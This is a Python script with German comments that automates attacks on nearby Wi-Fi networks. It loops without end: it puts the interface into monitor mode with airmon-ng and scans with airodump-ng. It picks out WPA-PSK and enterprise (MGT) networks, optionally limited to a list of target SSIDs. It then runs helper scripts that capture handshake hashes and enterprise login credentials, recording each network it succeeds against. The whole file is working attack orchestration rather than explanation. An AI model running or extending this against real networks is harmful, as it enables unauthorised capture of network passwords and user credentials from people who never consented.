#!/usr/bin/env python3
import csv
import os
import subprocess
import time


TARGET_SSIDS = [""]

INTERFACE_RECON = "wlan0mon"
BASE_DIR = "/home/atlantis/ordner"
WORKSPACE = os.path.join(BASE_DIR, "sniffing")
OUTBOX = os.path.join(BASE_DIR, "outbox")

DONE_FILE = os.path.join(WORKSPACE, "done.txt")

CSV_FILE = os.path.join(WORKSPACE, "recon_scan-01.csv")
RECON_PREFIX = os.path.join(WORKSPACE, "recon_scan")

PSK_WORKER = os.path.join(BASE_DIR, "autosniff.sh")
MGT_WORKER = os.path.join(BASE_DIR, "automgt.sh")


def init_monitor_interface():
    print("Setze WLAN-Schnittstelle zurück")
    # Schießt störende Prozesse ab und startet den Monitor Mode neu
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "airmon-ng", "stop", INTERFACE_RECON], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "up"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], stdout=subprocess.DEVNULL)


def run_passive_recon():
    print("\n 30sek scan...")
    
    if os.path.exists(CSV_FILE):
        os.remove(CSV_FILE)

    cmd = ["sudo", "airodump-ng", INTERFACE_RECON, "--output-format", "csv", "-w", RECON_PREFIX]
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    
    for remaining in range(30, 0, -1):
        print(f" -> Scanne... noch {remaining} Sek.", end="\r")
        time.sleep(1)

    
    process.terminate()
    process.wait()
    print("\n Scan beendet.")


def parse_targets():
    if not os.path.exists(CSV_FILE):
        return []

    done_list = []
    if os.path.exists(DONE_FILE):
        with open(DONE_FILE, "r") as f:
            done_list = f.read().splitlines()

    tasks = []

    with open(CSV_FILE, mode="r", encoding="utf-8") as file:
        reader = csv.reader(file)

        for row in reader:
            if not row or len(row) < 14:
                continue

            # Trennung zwischen Access Points und Clients
            if row[0].strip().lower().startswith("station mac"):
                break

            if row[0].strip().lower() == "bssid":
                continue

            ssid = row[13].strip()
            bssid = row[0].strip()
            channel = row[3].strip()
            auth = row[7].strip().upper()

            if not ssid or not channel.isdigit():
                continue

            # Wenn die Zielliste nicht leer ist, filtern
            if TARGET_SSIDS and ssid not in TARGET_SSIDS:
                continue

            if ssid in done_list:
                continue

            # Nur relevante Verschlüsselungen sichern
            if auth in ["PSK", "MGT"]:
                task = {
                    "ssid": ssid,
                    "bssid": bssid,
                    "channel": channel,
                    "auth": auth
                }
                tasks.append(task)

    return tasks


def main():
    os.makedirs(WORKSPACE, exist_ok=True)
    os.makedirs(OUTBOX, exist_ok=True)
    init_monitor_interface()

    while True:
        run_passive_recon()
        all_tasks = parse_targets()

        if not all_tasks:
            print("Keine Netze gefunden. Schlafe 5 Minuten...")
            time.sleep(300)
            continue

        # Trennung in zwei Listen, um PSK logisch vor MGT zu ziehen
        psk_tasks = []
        mgt_tasks = []

        for task in all_tasks:
            if task["auth"] == "PSK":
                psk_tasks.append(task)
            else:
                mgt_tasks.append(task)

        
        for t in psk_tasks:
            print(f"\n PSK Starte autosniff.sh für {t['ssid']} ")
            
            # subprocess.run gibt das Ergebnis zurück
            result = subprocess.run([PSK_WORKER, t["channel"], t["bssid"], t["ssid"]])
            
            if result.returncode == 0:
                print(f" Hash für {t['ssid']} erfolgreich gesichert. Setze auf Blacklist.")
                with open(DONE_FILE, "a") as f:
                    f.write(t["ssid"] + "\n")
            else:
                print(f" Kein Erfolg bei {t['ssid']}. Wird im nächsten Zyklus erneut versucht.")

        for t in mgt_tasks:
            print(f"\n MGT Starte automgt.sh für {t['ssid']} ")
            
            result = subprocess.run([MGT_WORKER, t["channel"], t["bssid"], t["ssid"]])
            
            if result.returncode == 0:
                print(f" Enterprise-Credentials für {t['ssid']} gesichert. Setze auf Blacklist.")
                with open(DONE_FILE, "a") as f:
                    f.write(t["ssid"] + "\n")
            else:
                print(f" Keine Credentials für {t['ssid']} erfasst. Wird im nächsten Zyklus erneut versucht.")

            # interface reset
            init_monitor_interface()

        print("\n Warte 5 sec")
        time.sleep(5)

if __name__ == "__main__":
    main()
